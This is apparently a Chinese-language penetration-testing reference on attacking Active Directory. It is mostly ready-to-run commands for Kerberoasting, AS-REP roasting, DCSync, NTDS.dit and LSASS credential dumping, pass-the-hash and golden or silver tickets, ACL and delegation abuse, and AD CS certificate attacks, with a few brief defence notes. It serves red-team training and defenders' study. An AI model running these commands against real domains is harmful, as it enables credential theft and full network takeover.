# AD 攻击面

### 2.1 信息收集

#### 域信息枚举（BloodHound / SharpHound）

**BloodHound**：图形化分析 AD 信任关系和攻击路径的工具。

```bash
# SharpHound 数据收集（PowerShell）
# 导入模块
Import-Module .\SharpHound.ps1

# 收集所有数据
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\

# 仅收集会话信息
Invoke-BloodHound -CollectionMethod Sessions -OutputDirectory C:\temp\

# 用 BloodHound 图形界面导入 JSON 数据分析
# neo4j 数据库存储图数据，查询最短攻击路径
```

#### 用户 / 组 / 计算机枚举

```bash
# PowerView（PowerShell 模块）
Import-Module .\PowerView.ps1

# 枚举域用户
Get-NetUser | select name, samaccountname, description

# 枚举域管组
Get-NetGroupMember -GroupName "Domain Admins"

# 枚举域内所有计算机
Get-NetComputer | select name, operatingsystem

# 查找域控
Get-NetDomainController

# 查找非约束委派账户
Get-NetUser -Unconstrained
```

#### GPO 枚举

```bash
# 枚举组策略对象
Get-NetGPO | select displayname, gpcfilesyspath

# 查找应用于特定OU的GPO
Get-NetGPO -OrganizationalUnit "OU=Servers,DC=corp,DC=local"

# 解析GPO中的安全配置
Get-GptTmpl -GPOName "{31B2F340-016D-11D2-945F-00C04FB984F9}"
```

#### SPN 扫描与 Kerberoasting 前置

```bash
# 查找所有配置了 SPN 的账户
Get-NetUser -SPN | select samaccountname, serviceprincipalname

# 原生 setspn 命令
setspn -T corp.local -Q */*
```

### 2.2 凭证获取

#### Kerberoasting 攻击原理

**原理**：任何域用户都可以请求服务账户的 ST（服务票据），ST 用服务账户的密码哈希加密。如果服务账户密码较弱，可离线爆破。

```bash
# Rubeus（C#工具）请求所有SPN的TGS票据
Rubeus.exe kerberoast /outfile:hashes.txt

# Impacket（Python）Kerberoasting
python GetUserSPNs.py corp.local/user:password -request

# hashcat 离线爆破 Kerberoast 哈希
hashcat -m 13100 hashes.txt wordlist.txt --force
# 13100 = Kerberos 5 TGS-REP etype 23 (RC4)
```

**防御**：
- 服务账户使用25+字符强密码
- 使用组托管服务账户（gMSA），密码自动轮换
- 票据加密使用 AES-256 而非 RC4

#### AS-REP Roasting

**原理**：对于配置了"不需要 Kerberos 预认证"的账户，攻击者可直接请求 AS-REP，其中包含用用户密码哈希加密的数据。

```bash
# Rubeus AS-REP Roasting
Rubeus.exe asreproast /outfile:hashes.txt

# Impacket
python GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -format hashcat

# hashcat 爆破
hashcat -m 18200 hashes.txt wordlist.txt
# 18200 = Kerberos 5 AS-REP etype 23
```

#### DCSync 攻击（DRSUAPI）

**原理**：拥有"复制目录变更"权限的账户（如 Domain Admins 或被过度委派的账户）可通过 `DRSGetNCChanges` 接口模拟域控复制，直接获取任意用户的密码哈希。

```bash
# Mimikatz DCSync
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator

# Impacket secretsdump
python secretsdump.py -just-dc-user Administrator corp.local/user:password@dc01.corp.local
```

#### NTDS.dit 提取

**NTDS.dit** 是域控上的 AD 数据库文件，存储所有用户哈希。

```bash
# 使用 ntdsutil 创建 IFM 介质（需要管理员权限）
ntdsutil
  > activate instance ntds
  > ifm
  > create full C:\temp\ntds_dump
  > quit

# 或使用 vssadmin 卷影复制提取
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# 使用 secretsdump 解析
python secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

#### LSASS 凭据

LSASS 进程内存中缓存了多种凭据（NTLM 哈希、Kerberos 票据、明文密码等）。

```bash
# Mimikatz 从 LSASS 提取
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets    # 导出票据

# comsvcs.dll 迷你转储（无需 mimikatz）
rundll32 comsvcs.dll MiniDump <lsass_pid> C:\temp\lsass.dmp full
```

### 2.3 横向移动

#### Pass-the-Hash (PtH)

**原理**：使用 NTLM 哈希代替密码进行认证。

```bash
# Mimikatz Pass-the-Hash
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe

# Impacket PsExec
python psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/Administrator@target
```

#### Pass-the-Ticket (PtT)

**原理**：直接使用已获取的 Kerberos 票据进行认证。

```bash
# Mimikatz 导出票据
mimikatz # sekurlsa::tickets /export

# 注入票据
mimikatz # kerberos::ptt C:\temp\ticket.kirbi

# Rubeus 票据注入
Rubeus.exe ptt /ticket:base64_ticket_data
```

#### Overpass-the-Hash

**原理**：用 NTLM 哈希获取完整的 TGT，然后正常使用 Kerberos 认证，规避 NTLM 日志。

```bash
mimikatz # sekurlsa::pth /user:user1 /domain:corp.local /ntlm:aad3b435... /run:powershell.exe
# 在新进程中执行 klist 获取 TGT，然后使用 Kerberos 认证
```

#### 黄金票据（Golden Ticket）

**原理**：攻击者获取 krbtgt 账户哈希后，可伪造任意用户的 TGT，包括不存在的用户，赋予任意权限。

```bash
# Mimikatz 生成黄金票据
mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:<ntlm_hash> /id:500 /ptt

# 特征：即使 krbtgt 密码已轮换一次（需要轮换两次才能完全失效）
```

**防御**：
- 定期轮换 krbtgt 密码（需两次）
- 监控异常 TGT（有效期异常、PAC 不匹配）
- 限制 DC 权限

#### 白银票据（Silver Ticket）

**原理**：用服务账户哈希伪造 ST（服务票据），不经过 KDC，不需要 TGT。

```bash
mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /target:sql01.corp.local /service:cifs /rc4:<service_hash> /ptt
```

#### 钻石票据（Diamond Ticket）

**原理**：获取合法 TGT 后，修改其中的 PAC（提升权限），再用 krbtgt 哈希重新签名。比黄金票据更隐蔽，因为 TGT 来源于合法请求。

### 2.4 域提权

#### 滥用 ACL

AD 中对象的 ACL 权限可被滥用实现提权：

| 权限 | 滥用方式 |
|------|---------|
| `GenericAll` | 修改目标用户密码、添加到组 |
| `ForceChangePassword` | 重置目标用户密码 |
| `AddMember` | 将自己添加到高权组 |
| `GenericWrite` | 修改目标属性（如 SPN，用于 Kerberoasting） |
| `WriteDacl` | 修改 ACL 赋予自己更多权限 |

```bash
# PowerView：利用 GenericAll 重置密码
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "NewP@ss!" -AsPlainText -Force)

# 利用 AddMember 将自己加入高权组
Add-DomainGroupMember -Identity "Help Desk" -Members "attacker"
```

#### Kerberos 委派攻击

| 委派类型 | 说明 | 攻击方式 |
|----------|------|---------|
| **非约束委派** | 服务可代表任何用户获取任何服务的票据 | 诱使域管访问服务，获取其 TGT |
| **约束委派** | 服务仅可代表用户获取指定服务的 ST | S4U2Self/S4U2Proxy 滥用 |
| **基于资源的约束委派（RBCD）** | 通过 msDS-AllowedToActOnBehalfOfOtherIdentity 配置 | 添加计算机账户后模拟任意用户 |

```bash
# 查找非约束委派计算机
Get-NetComputer -Unconstrained

# RBCD 攻击（需要 MachineAccountQuota 权限）
# 1. 创建计算机账户
Invoke-CreateComputer -ComputerName "EVIL$" -Password "Pass123!"

# 2. 在目标计算机上设置 RBCD
Set-RBCD -Identity TARGET$ -DelegateFrom "EVIL$"

# 3. 使用 Rubeus 通过 S4U 获取票据
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /dc:dc01.corp.local /ptt /user:EVIL$ /rc4:<hash>
```

#### 域信任关系利用

**信任方向**：
- 单向信任：A 信任 B，则 B 的用户可访问 A 的资源
- 双向信任：互相可访问

```bash
# 枚举域信任
Get-NetDomainTrust

# 跨域枚举
Get-NetForestDomain    # 获取林内所有域
Get-NetForestTrust     # 获取林信任
```

#### AD CS 攻击（ESC1-ESC8）

**AD CS（Active Directory 证书服务）** 可被滥用签发证书绕过认证。

| 编号 | 名称 | 说明 |
|------|------|------|
| ESC1 | 低权限模板可指定 SAN | 申请证书时冒充任意用户 |
| ESC2 | 任意目的模板滥用 | 利用 Any Purpose EKU 签发证书 |
| ESC3 | 证书申请代理模板 | 用代理证书为他人申请 |
| ESC4 | 模板 ACL 过宽 | 修改模板配置 |
| ESC5 | PKI 对象 ACL 过宽 | 修改 CA 配置 |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | 全局允许 SAN 指定 |
| ESC7 | CA 管理员权限滥用 | 通过 CA 管理角色利用 |
| ESC8 | NTLM Relay 到 Web Enrollment | 中继认证到证书注册接口 |

```bash
# Certify（C#工具）枚举易受攻击的证书模板
Certify.exe find /vulnerable

# 申请 ESC1 证书（冒充 Administrator）
Certify.exe request /ca:DC01\corp-CA /template:VulnTemplate /altname:Administrator
```

---

---

